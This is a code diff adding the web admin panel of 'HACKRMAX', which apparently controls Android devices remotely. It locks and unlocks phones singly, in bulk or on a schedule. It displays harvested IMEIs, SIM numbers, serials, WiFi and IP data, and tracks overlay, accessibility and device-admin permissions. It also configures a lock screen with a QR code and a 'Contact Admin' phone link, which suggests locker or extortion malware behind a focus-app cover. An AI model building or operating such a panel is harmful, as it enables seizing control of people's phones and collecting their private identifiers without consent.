@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>HACKRMAX — Admin</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#08080f;--bg2:#0f0f1a;--bg3:#13131f;--bg4:#1a1a2e;
+  --border:#1e1e30;--accent:#ff3366;--green:#00e676;
+  --yellow:#ffeb3b;--blue:#2196f3;--text:#fff;--sub:#777;
+}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;min-height:100vh}
+
+/* ── LOGIN ── */
+#login-screen{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:9999}
+.login-box{background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:44px 36px;width:360px;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+.login-logo{font-size:26px;font-weight:900;letter-spacing:4px;text-align:center;margin-bottom:4px}
+.login-logo span{color:var(--accent)}
+.login-sub{font-size:11px;color:var(--sub);text-align:center;letter-spacing:2px;margin-bottom:32px}
+.login-label{font-size:11px;color:var(--sub);letter-spacing:1px;margin-bottom:6px;display:block}
+.login-input{width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:13px 16px;color:#fff;font-size:14px;margin-bottom:14px;outline:none;transition:.2s}
+.login-input:focus{border-color:var(--accent)}
+.login-btn{width:100%;background:var(--accent);border:none;border-radius:10px;padding:14px;color:#fff;font-size:14px;font-weight:700;letter-spacing:2px;cursor:pointer;margin-top:4px;transition:.15s}
+.login-btn:hover{opacity:.9}
+.login-err{font-size:12px;color:var(--accent);text-align:center;min-height:18px;margin-top:10px;letter-spacing:1px}
+
+/* ── PANEL ── */
+#panel{display:none}
+.header{background:var(--bg2);border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.logo{font-size:18px;font-weight:900;letter-spacing:3px}.logo span{color:var(--accent)}
+.hdr-right{display:flex;align-items:center;gap:12px}
+.live-dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.logout-btn{background:var(--bg3);border:1px solid var(--border);color:var(--sub);padding:6px 14px;border-radius:8px;cursor:pointer;font-size:12px;letter-spacing:1px}
+.logout-btn:hover{border-color:var(--accent);color:#fff}
+
+/* Stats */
+.stats-bar{display:flex;gap:10px;padding:16px 24px;background:var(--bg2);border-bottom:1px solid var(--border);flex-wrap:wrap}
+.stat{background:var(--bg3);border:1px solid var(--border);padding:10px 18px;border-radius:10px;text-align:center;min-width:90px}
+.stat-n{font-size:24px;font-weight:800;color:var(--accent)}
+.stat-n.green{color:var(--green)}
+.stat-n.blue{color:var(--blue)}
+.stat-n.yellow{color:var(--yellow)}
+.stat-l{font-size:9px;color:var(--sub);letter-spacing:1px;margin-top:2px}
+
+/* Tabs */
+.tabs{display:flex;background:var(--bg2);border-bottom:1px solid var(--border);overflow-x:auto}
+.tab{padding:13px 22px;cursor:pointer;font-size:12px;letter-spacing:1px;color:var(--sub);border-bottom:2px solid transparent;transition:.2s;white-space:nowrap}
+.tab.on{color:#fff;border-bottom-color:var(--accent)}
+.page{display:none;padding:20px;max-width:1200px;margin:0 auto}
+.page.on{display:block}
+
+/* Bulk actions */
+.bulk-bar{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;align-items:center}
+.btn{padding:9px 18px;border:none;border-radius:9px;cursor:pointer;font-size:12px;font-weight:700;letter-spacing:1px;transition:.15s}
+.btn-red{background:var(--accent);color:#fff}.btn-red:hover{opacity:.85}
+.btn-green{background:var(--green);color:#000}.btn-green:hover{opacity:.85}
+.btn-blue{background:var(--blue);color:#fff}.btn-blue:hover{opacity:.85}
+.btn-gray{background:var(--bg3);border:1px solid var(--border);color:var(--sub)}.btn-gray:hover{color:#fff;border-color:#444}
+
+/* Search */
+.search{width:100%;background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:10px 16px;color:#fff;font-size:13px;margin-bottom:14px;outline:none}
+.search:focus{border-color:var(--accent)}
+
+/* Device cards */
+.device-card{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:15px 18px;margin-bottom:10px;display:flex;align-items:center;gap:14px;cursor:pointer;transition:.2s}
+.device-card:hover{border-color:#2a2a40;background:var(--bg3)}
+.device-card.locked-card{border-left:3px solid var(--accent)}
+.device-card.unlocked-card{border-left:3px solid var(--green)}
+.dc-status{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.dc-status.online{background:var(--green);box-shadow:0 0 6px var(--green)}
+.dc-status.offline{background:#444}
+.dc-info{flex:1;min-width:0}
+.dc-name{font-weight:700;font-size:14px;margin-bottom:3px;display:flex;align-items:center;gap:8px}
+.dc-id{font-size:10px;color:var(--accent);font-family:monospace;letter-spacing:1px}
+.dc-meta{font-size:11px;color:var(--sub);display:flex;gap:12px;flex-wrap:wrap;margin-top:4px}
+.dc-badge{font-size:10px;padding:2px 8px;border-radius:20px;font-weight:700;letter-spacing:1px}
+.badge-locked{background:rgba(255,51,102,.15);color:var(--accent);border:1px solid rgba(255,51,102,.3)}
+.badge-unlocked{background:rgba(0,230,118,.12);color:var(--green);border:1px solid rgba(0,230,118,.3)}
+.dc-battery{font-size:11px;color:var(--sub)}
+.dc-actions{display:flex;gap:8px;flex-shrink:0}
+.toggle-btn{padding:7px 14px;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;letter-spacing:1px;transition:.15s}
+.toggle-lock{background:var(--accent);color:#fff}
+.toggle-unlock{background:var(--green);color:#000}
+.detail-btn{padding:7px 12px;background:var(--bg3);border:1px solid var(--border);color:var(--sub);border-radius:8px;font-size:11px;cursor:pointer}
+.detail-btn:hover{color:#fff;border-color:#444}
+
+/* Detail Modal */
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:500;overflow-y:auto;padding:20px}
+.modal-overlay.on{display:flex;align-items:flex-start;justify-content:center}
+.modal{background:var(--bg2);border:1px solid var(--border);border-radius:16px;width:100%;max-width:700px;padding:24px;margin:auto}
+.modal-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+.modal-title{font-size:16px;font-weight:700}
+.modal-close{background:var(--bg3);border:1px solid var(--border);color:#fff;width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:16px}
+.detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px}
+.detail-section{grid-column:1/-1;font-size:11px;color:var(--accent);letter-spacing:2px;margin:12px 0 6px;font-weight:700;border-bottom:1px solid var(--border);padding-bottom:6px}
+.detail-item{background:var(--bg3);border-radius:8px;padding:10px 12px}
+.detail-key{font-size:10px;color:var(--sub);letter-spacing:1px;margin-bottom:4px}
+.detail-val{font-size:13px;color:#fff;font-weight:500;word-break:break-all}
+.detail-val.accent{color:var(--accent)}
+.log-item{background:var(--bg3);border-radius:8px;padding:9px 12px;margin-bottom:6px;display:flex;gap:10px;font-size:12px}
+.log-time{color:var(--sub);white-space:nowrap;font-family:monospace}
+.log-action{color:var(--accent);font-weight:700;min-width:80px}
+.log-detail{color:#ccc}
+
+/* Schedule */
+.sched-row{display:flex;gap:10px;align-items:center;margin-bottom:10px;flex-wrap:wrap}
+.sched-input{background:var(--bg3);border:1px solid var(--border);border-radius:9px;padding:9px 14px;color:#fff;font-size:13px;outline:none}
+.sched-input:focus{border-color:var(--accent)}
+
+/* Logs page */
+.log-row{background:var(--bg2);border:1px solid var(--border);border-radius:9px;padding:10px 14px;margin-bottom:6px;display:flex;gap:14px;font-size:12px;align-items:center}
+.log-row .lr-time{color:var(--sub);font-family:monospace;white-space:nowrap;min-width:130px}
+.log-row .lr-dev{color:var(--accent);font-family:monospace;min-width:60px}
+.log-row .lr-act{font-weight:700;min-width:100px}
+.log-row .lr-det{color:var(--sub)}
+
+/* Settings */
+.settings-form{max-width:500px}
+.form-group{margin-bottom:16px}
+.form-label{font-size:11px;color:var(--sub);letter-spacing:1px;display:block;margin-bottom:7px}
+.form-input{width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:11px 14px;color:#fff;font-size:14px;outline:none;transition:.2s}
+.form-input:focus{border-color:var(--accent)}
+
+/* Toast */
+.toast{position:fixed;bottom:24px;right:24px;background:var(--bg3);border:1px solid var(--border);padding:12px 20px;border-radius:10px;font-size:13px;z-index:9999;opacity:0;transform:translateY(10px);transition:.3s;pointer-events:none}
+.toast.show{opacity:1;transform:translateY(0)}
+.toast.success{border-color:var(--green);color:var(--green)}
+.toast.error{border-color:var(--accent);color:var(--accent)}
+
+/* Permission badges */
+.perm-grid{display:flex;gap:6px;flex-wrap:wrap;margin-top:4px}
+.perm-badge{font-size:9px;padding:2px 7px;border-radius:20px;font-weight:700}
+.perm-ok{background:rgba(0,230,118,.15);color:var(--green);border:1px solid rgba(0,230,118,.3)}
+.perm-no{background:rgba(255,51,102,.1);color:var(--accent);border:1px solid rgba(255,51,102,.2)}
+
+@media(max-width:600px){
+  .detail-grid{grid-template-columns:1fr}
+  .dc-actions{flex-direction:column}
+  .stats-bar{gap:6px}
+  .stat{min-width:70px;padding:8px 10px}
+}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div id="login-screen">
+  <div class="login-box">
+    <div class="login-logo">HACK<span>R</span>MAX</div>
+    <div class="login-sub">ADMIN CONTROL PANEL</div>
+    <label class="login-label">EMAIL</label>
+    <input class="login-input" id="l-email" type="email" placeholder="admin@company.com" autocomplete="email"/>
+    <label class="login-label">PASSWORD</label>
+    <input class="login-input" id="l-pass" type="password" placeholder="••••••••" autocomplete="current-password"
+           onkeydown="if(event.key==='Enter')doLogin()"/>
+    <button class="login-btn" onclick="doLogin()">LOGIN →</button>
+    <div class="login-err" id="l-err"></div>
+  </div>
+</div>
+
+<!-- PANEL -->
+<div id="panel">
+  <div class="header">
+    <div class="logo">HACK<span>R</span>MAX</div>
+    <div class="hdr-right">
+      <div class="live-dot" title="Live"></div>
+      <span style="font-size:11px;color:var(--sub)">LIVE</span>
+      <button class="logout-btn" onclick="doLogout()">LOGOUT</button>
+    </div>
+  </div>
+
+  <div class="stats-bar">
+    <div class="stat"><div class="stat-n" id="s-total">0</div><div class="stat-l">TOTAL</div></div>
+    <div class="stat"><div class="stat-n green" id="s-online">0</div><div class="stat-l">ONLINE</div></div>
+    <div class="stat"><div class="stat-n" style="color:#444" id="s-offline">0</div><div class="stat-l">OFFLINE</div></div>
+    <div class="stat"><div class="stat-n" id="s-locked">0</div><div class="stat-l">LOCKED</div></div>
+    <div class="stat"><div class="stat-n yellow" id="s-unlocked">0</div><div class="stat-l">UNLOCKED</div></div>
+  </div>
+
+  <div class="tabs">
+    <div class="tab on" onclick="showTab('devices')">📱 DEVICES</div>
+    <div class="tab" onclick="showTab('logs')">📋 LOGS</div>
+    <div class="tab" onclick="showTab('settings')">⚙️ SETTINGS</div>
+  </div>
+
+  <!-- DEVICES -->
+  <div class="page on" id="page-devices">
+    <div class="bulk-bar">
+      <button class="btn btn-red" onclick="bulkAction(true)">🔒 LOCK ALL</button>
+      <button class="btn btn-green" onclick="bulkAction(false)">🔓 UNLOCK ALL</button>
+      <button class="btn btn-gray" onclick="loadData()">↻ REFRESH</button>
+    </div>
+    <input class="search" id="search" placeholder="Search device name, ID, model, SIM..." oninput="filterDevices()"/>
+    <div id="device-list"></div>
+  </div>
+
+  <!-- LOGS -->
+  <div class="page" id="page-logs">
+    <div style="display:flex;gap:10px;margin-bottom:14px">
+      <button class="btn btn-gray" onclick="loadLogs()">↻ REFRESH</button>
+      <span style="font-size:12px;color:var(--sub);align-self:center">Latest 300 entries</span>
+    </div>
+    <div id="log-list"></div>
+  </div>
+
+  <!-- SETTINGS -->
+  <div class="page" id="page-settings">
+    <div class="settings-form">
+      <h3 style="margin-bottom:18px;font-size:14px;letter-spacing:2px;color:var(--sub)">LOCK SCREEN SETTINGS</h3>
+      <div class="form-group">
+        <label class="form-label">TITLE (shown on lock screen)</label>
+        <input class="form-input" id="s-title" placeholder="Stay Focused!"/>
+      </div>
+      <div class="form-group">
+        <label class="form-label">SUBTITLE</label>
+        <input class="form-input" id="s-subtitle" placeholder="Deep work mode active"/>
+      </div>
+      <div class="form-group">
+        <label class="form-label">QR CODE URL (image URL)</label>
+        <input class="form-input" id="s-qr" placeholder="https://..."/>
+      </div>
+      <div class="form-group">
+        <label class="form-label">BUTTON 1 TEXT</label>
+        <input class="form-input" id="s-btn1" placeholder="UNLOCK"/>
+      </div>
+      <div class="form-group">
+        <label class="form-label">BUTTON 2 TEXT</label>
+        <input class="form-input" id="s-btn2" placeholder="Contact Admin"/>
+      </div>
+      <div class="form-group">
+        <label class="form-label">BUTTON 2 URL</label>
+        <input class="form-input" id="s-btn2url" placeholder="tel:+91..."/>
+      </div>
+      <button class="btn btn-red" onclick="saveSettings()">SAVE SETTINGS</button>
+    </div>
+  </div>
+</div>
+
+<!-- DEVICE DETAIL MODAL -->
+<div class="modal-overlay" id="modal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title" id="modal-title">Device Details</div>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div id="modal-body"></div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ── STATE ──
+let allDevices = [];
+let adminSSE   = null;
+
+// ── LOGIN ──
+async function doLogin() {
+  const email = document.getElementById('l-email').value.trim();
+  const pass  = document.getElementById('l-pass').value;
+  document.getElementById('l-err').textContent = '';
+  try {
+    const r = await fetch('/login', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({email, password: pass})
+    });
+    const d = await r.json();
+    if (d.ok) {
+      document.getElementById('login-screen').style.display = 'none';
+      document.getElementById('panel').style.display = 'block';
+      init();
+    } else {
+      document.getElementById('l-err').textContent = d.error || 'Invalid credentials';
+    }
+  } catch(e) {
+    document.getElementById('l-err').textContent = 'Connection error';
+  }
+}
+
+async function doLogout() {
+  await fetch('/logout', {method:'POST'});
+  location.reload();
+}
+
+// ── INIT ──
+function init() {
+  loadData();
+  loadLogs();
+  connectAdminSSE();
+}
+
+// ── SSE (Live Updates) ──
+function connectAdminSSE() {
+  if (adminSSE) adminSSE.close();
+  adminSSE = new EventSource('/admin/events');
+  adminSSE.onmessage = e => {
+    try {
+      const d = JSON.parse(e.data);
+      if (d.type === 'device_update') loadData();
+      if (d.type === 'ping') updateOnlineStatus(d);
+    } catch(err) {}
+  };
+  adminSSE.onerror = () => {
+    setTimeout(connectAdminSSE, 3000);
+  };
+}
+
+// ── LOAD DATA ──
+async function loadData() {
+  try {
+    const r = await fetch('/admin/data');
+    if (r.status === 401) { location.reload(); return; }
+    const d = await r.json();
+    allDevices = d.devices || [];
+    updateStats(d.stats || {});
+    renderDevices(allDevices);
+    if (d.settings) fillSettings(d.settings);
+  } catch(e) {}
+}
+
+function updateStats(s) {
+  document.getElementById('s-total').textContent   = s.total   || 0;
+  document.getElementById('s-online').textContent  = s.online  || 0;
+  document.getElementById('s-offline').textContent = s.offline || 0;
+  document.getElementById('s-locked').textContent  = s.locked  || 0;
+  document.getElementById('s-unlocked').textContent= s.unlocked|| 0;
+}
+
+function updateOnlineStatus(d) {
+  // Lightweight ping update — just reload stats
+  loadData();
+}
+
+// ── RENDER DEVICES ──
+function renderDevices(devices) {
+  const el = document.getElementById('device-list');
+  if (!devices.length) {
+    el.innerHTML = '<div style="text-align:center;color:var(--sub);padding:40px;font-size:13px">No devices registered yet</div>';
+    return;
+  }
+  el.innerHTML = devices.map(d => `
+    <div class="device-card ${d.locked ? 'locked-card':'unlocked-card'}" id="dc-${d.device_id}">
+      <div class="dc-status ${d.online ? 'online':'offline'}"></div>
+      <div class="dc-info">
+        <div class="dc-name">
+          ${esc(d.name || 'Unknown')}
+          <span class="dc-id">${d.device_id}</span>
+          <span class="dc-badge ${d.locked ? 'badge-locked':'badge-unlocked'}">${d.locked?'LOCKED':'UNLOCKED'}</span>
+        </div>
+        <div class="dc-meta">
+          <span>📱 ${esc(d.model||'')} ${esc(d.brand||'')}</span>
+          ${d.battery ? `<span>🔋 ${d.battery}%${d.battery_charging?'⚡':''}</span>` : ''}
+          ${d.network_type ? `<span>📶 ${esc(d.network_type)}</span>` : ''}
+          ${d.wifi_ssid ? `<span>WiFi: ${esc(d.wifi_ssid)}</span>` : ''}
+          <span style="color:${d.online?'var(--green)':'#555'}">${d.online?'● ONLINE':'○ OFFLINE'}</span>
+          ${d.last_seen ? `<span>Last: ${d.last_seen}</span>` : ''}
+        </div>
+        <div class="perm-grid">
+          ${permBadge(d.perm_overlay,'OVR')}
+          ${permBadge(d.perm_accessibility,'ACC')}
+          ${permBadge(d.perm_admin,'ADM')}
+          ${permBadge(d.perm_battery,'BAT')}
+        </div>
+      </div>
+      <div class="dc-actions">
+        ${d.locked
+          ? `<button class="toggle-btn toggle-unlock" onclick="toggleDevice('${d.device_id}',false,event)">🔓 UNLOCK</button>`
+          : `<button class="toggle-btn toggle-lock"   onclick="toggleDevice('${d.device_id}',true,event)">🔒 LOCK</button>`}
+        <button class="detail-btn" onclick="openDetail('${d.device_id}',event)">DETAILS</button>
+      </div>
+    </div>
+  `).join('');
+}
+
+function permBadge(val, label) {
+  return `<span class="perm-badge ${val ? 'perm-ok':'perm-no'}">${label} ${val?'✓':'✗'}</span>`;
+}
+
+function filterDevices() {
+  const q = document.getElementById('search').value.toLowerCase();
+  if (!q) { renderDevices(allDevices); return; }
+  renderDevices(allDevices.filter(d =>
+    (d.name||'').toLowerCase().includes(q) ||
+    (d.device_id||'').toLowerCase().includes(q) ||
+    (d.model||'').toLowerCase().includes(q) ||
+    (d.sim1_number||'').includes(q) ||
+    (d.sim2_number||'').includes(q) ||
+    (d.sim1_operator||'').toLowerCase().includes(q) ||
+    (d.wifi_ssid||'').toLowerCase().includes(q)
+  ));
+}
+
+// ── TOGGLE LOCK ──
+async function toggleDevice(did, lock, e) {
+  e && e.stopPropagation();
+  try {
+    const r = await fetch('/admin/toggle', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({device_id: did, locked: lock})
+    });
+    const d = await r.json();
+    if (d.success) {
+      toast(lock ? '🔒 Locked' : '🔓 Unlocked', 'success');
+      loadData();
+    } else toast('Error: ' + (d.error||''), 'error');
+  } catch(e) { toast('Network error', 'error'); }
+}
+
+async function bulkAction(lock) {
+  if (!confirm(`${lock ? 'LOCK' : 'UNLOCK'} ALL devices?`)) return;
+  try {
+    const r = await fetch('/admin/bulk', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({locked: lock})
+    });
+    const d = await r.json();
+    if (d.success) {
+      toast(`${lock?'🔒 Locked':'🔓 Unlocked'} ${d.count} devices`, 'success');
+      loadData();
+    }
+  } catch(e) { toast('Error', 'error'); }
+}
+
+// ── DETAIL MODAL ──
+async function openDetail(did, e) {
+  e && e.stopPropagation();
+  document.getElementById('modal').classList.add('on');
+  document.getElementById('modal-body').innerHTML =
+    '<div style="text-align:center;color:var(--sub);padding:30px">Loading...</div>';
+  try {
+    const r = await fetch(`/admin/device/${did}`);
+    const data = await r.json();
+    const d = data.device || {};
+    const logs = data.logs || [];
+    document.getElementById('modal-title').textContent =
+      `${d.name || 'Device'} — ${d.device_id}`;
+
+    document.getElementById('modal-body').innerHTML = `
+      <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
+        ${d.locked
+          ? `<button class="btn btn-green" onclick="toggleDevice('${d.device_id}',false,null);closeModal()">🔓 UNLOCK</button>`
+          : `<button class="btn btn-red"   onclick="toggleDevice('${d.device_id}',true,null);closeModal()">🔒 LOCK</button>`}
+        <div class="sched-row">
+          <input class="sched-input" type="datetime-local" id="sched-${d.device_id}"/>
+          <button class="btn btn-blue" onclick="scheduleUnlock('${d.device_id}')">⏰ Schedule Unlock</button>
+        </div>
+      </div>
+
+      <div class="detail-grid">
+        <div class="detail-section">📱 IDENTITY</div>
+        ${di('Device ID',   d.device_id,   true)}
+        ${di('Android ID',  d.android_id)}
+        ${di('Name',        d.name)}
+        ${di('Model',       d.model)}
+        ${di('Brand',       d.brand)}
+        ${di('Manufacturer',d.manufacturer)}
+        ${di('Android',     d.android_version + ' (SDK ' + d.sdk_version + ')')}
+        ${di('CPU Arch',    d.cpu_arch)}
+        ${di('CPU Cores',   d.cpu_cores)}
+        ${di('Serial',      d.serial)}
+        ${di('Fingerprint', d.fingerprint)}
+
+        <div class="detail-section">📡 SIM 1</div>
+        ${di('Operator',   d.sim1_operator, true)}
+        ${di('Number',     d.sim1_number,   true)}
+        ${di('IMEI',       d.sim1_imei,     true)}
+        ${di('Country',    d.sim1_country)}
+        ${di('Network',    d.sim1_network)}
+        ${di('Signal',     d.sim1_signal)}
+
+        <div class="detail-section">📡 SIM 2</div>
+        ${di('Operator',   d.sim2_operator, true)}
+        ${di('Number',     d.sim2_number,   true)}
+        ${di('IMEI',       d.sim2_imei,     true)}
+        ${di('Country',    d.sim2_country)}
+        ${di('Network',    d.sim2_network)}
+        ${di('Signal',     d.sim2_signal)}
+
+        <div class="detail-section">🌐 NETWORK</div>
+        ${di('WiFi SSID',   d.wifi_ssid)}
+        ${di('WiFi BSSID',  d.wifi_bssid)}
+        ${di('WiFi Signal', d.wifi_signal)}
+        ${di('IP (Local)',  d.ip_address)}
+        ${di('IP (Public)', d.public_ip)}
+        ${di('Network',     d.network_type)}
+        ${di('Mobile Data', d.mobile_data ? 'ON' : 'OFF')}
+
+        <div class="detail-section">🔋 BATTERY</div>
+        ${di('Level',       d.battery + '%')}
+        ${di('Charging',    d.battery_charging ? 'Yes ⚡' : 'No')}
+        ${di('Health',      d.battery_health)}
+        ${di('Temperature', d.battery_temp)}
+
+        <div class="detail-section">💾 HARDWARE</div>
+        ${di('RAM Total',     d.ram_total)}
+        ${di('RAM Available', d.ram_available)}
+        ${di('Storage Total', d.storage_total)}
+        ${di('Storage Free',  d.storage_free)}
+        ${di('SD Total',      d.sd_total)}
+        ${di('SD Free',       d.sd_free)}
+        ${di('Screen',        d.screen_width + 'x' + d.screen_height + ' @' + d.screen_density + 'dpi')}
+        ${di('Screen Size',   d.screen_size)}
+
+        <div class="detail-section">🛡️ PERMISSIONS</div>
+        ${di('Overlay',       d.perm_overlay     ? '✅ Granted' : '❌ Missing')}
+        ${di('Accessibility', d.perm_accessibility ? '✅ Granted' : '❌ Missing')}
+        ${di('Device Admin',  d.perm_admin       ? '✅ Granted' : '❌ Missing')}
+        ${di('Battery Opt.',  d.perm_battery     ? '✅ Granted' : '❌ Missing')}
+
+        <div class="detail-section">🌍 LOCALE</div>
+        ${di('Timezone',  d.timezone)}
+        ${di('Language',  d.language)}
+        ${di('Country',   d.country)}
+
+        <div class="detail-section">📦 APP</div>
+        ${di('Package',   d.package_name)}
+        ${di('Version',   d.app_version)}
+        ${di('Registered',d.registered_at)}
+        ${di('Last Seen', d.last_seen)}
+      </div>
+
+      <div style="font-size:11px;color:var(--accent);letter-spacing:2px;margin:16px 0 10px;font-weight:700">📋 ACTIVITY LOG</div>
+      ${logs.length ? logs.map(l => `
+        <div class="log-item">
+          <span class="log-time">${l.timestamp}</span>
+          <span class="log-action">${l.action}</span>
+          <span class="log-detail">${esc(l.detail||'')}</span>
+        </div>`).join('') : '<div style="color:var(--sub);font-size:12px">No logs yet</div>'}
+
+      <div style="margin-top:20px">
+        <button class="btn btn-gray" onclick="if(confirm('Delete this device?'))deleteDevice('${d.device_id}')">🗑 Delete Device</button>
+      </div>
+    `;
+  } catch(e) {
+    document.getElementById('modal-body').innerHTML =
+      '<div style="color:var(--accent);padding:20px">Error loading details</div>';
+  }
+}
+
+function di(key, val, accent=false) {
+  if (!val || val === 'undefined' || val === 'null' || val === '' || val === 'x') return '';
+  return `<div class="detail-item">
+    <div class="detail-key">${key}</div>
+    <div class="detail-val ${accent?'accent':''}">${esc(String(val))}</div>
+  </div>`;
+}
+
+function closeModal() {
+  document.getElementById('modal').classList.remove('on');
+}
+
+async function scheduleUnlock(did) {
+  const val = document.getElementById(`sched-${did}`).value;
+  if (!val) { toast('Pick a date/time','error'); return; }
+  // Convert to "YYYY-MM-DD HH:MM"
+  const dt = val.replace('T',' ').substring(0,16);
+  const r = await fetch('/admin/schedule', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({device_id:did, unlock_time:dt})
+  });
+  const d = await r.json();
+  if (d.success) toast('⏰ Scheduled!','success');
+  else toast('Error','error');
+}
+
+async function deleteDevice(did) {
+  const r = await fetch('/admin/delete_device', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({device_id:did})
+  });
+  const d = await r.json();
+  if (d.success) { closeModal(); toast('Deleted','success'); loadData(); }
+}
+
+// ── LOGS ──
+async function loadLogs() {
+  try {
+    const r = await fetch('/admin/logs');
+    const d = await r.json();
+    const el = document.getElementById('log-list');
+    const logs = d.logs || [];
+    if (!logs.length) { el.innerHTML = '<div style="color:var(--sub);padding:20px;font-size:13px">No logs yet</div>'; return; }
+    el.innerHTML = logs.map(l => `
+      <div class="log-row">
+        <span class="lr-time">${l.timestamp}</span>
+        <span class="lr-dev">${l.device_id}</span>
+        <span class="lr-act" style="color:${logColor(l.action)}">${l.action}</span>
+        <span class="lr-det">${esc(l.detail||'')}</span>
+      </div>`).join('');
+  } catch(e) {}
+}
+
+function logColor(action) {
+  if (action.includes('LOCK')) return 'var(--accent)';
+  if (action.includes('UNLOCK')) return 'var(--green)';
+  if (action.includes('REGISTER')) return 'var(--blue)';
+  if (action.includes('DELETE')) return '#ff6600';
+  return 'var(--sub)';
+}
+
+// ── SETTINGS ──
+function fillSettings(s) {
+  document.getElementById('s-title').value    = s.title    || '';
+  document.getElementById('s-subtitle').value = s.subtitle || '';
+  document.getElementById('s-qr').value       = s.qr_url   || '';
+  document.getElementById('s-btn1').value     = s.btn1_text|| '';
+  document.getElementById('s-btn2').value     = s.btn2_text|| '';
+  document.getElementById('s-btn2url').value  = s.btn2_url || '';
+}
+
+async function saveSettings() {
+  const data = {
+    title:    document.getElementById('s-title').value,
+    subtitle: document.getElementById('s-subtitle').value,
+    qr_url:   document.getElementById('s-qr').value,
+    btn1_text:document.getElementById('s-btn1').value,
+    btn2_text:document.getElementById('s-btn2').value,
+    btn2_url: document.getElementById('s-btn2url').value,
+  };
+  const r = await fetch('/admin/settings', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(data)
+  });
+  const d = await r.json();
+  if (d.success) toast('✅ Settings saved','success');
+  else toast('Error','error');
+}
+
+// ── TABS ──
+function showTab(name) {
+  document.querySelectorAll('.tab').forEach((t,i) => {
+    const names = ['devices','logs','settings'];
+    t.classList.toggle('on', names[i] === name);
+  });
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('on'));
+  document.getElementById('page-'+name).classList.add('on');
+  if (name === 'logs') loadLogs();
+}
+
+// ── UTILS ──
+function esc(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function toast(msg, type='success') {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = `toast ${type} show`;
+  setTimeout(() => el.classList.remove('show'), 3000);
+}
+
+// Close modal on outside click
+document.getElementById('modal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+</script>
+</body>
+</html>
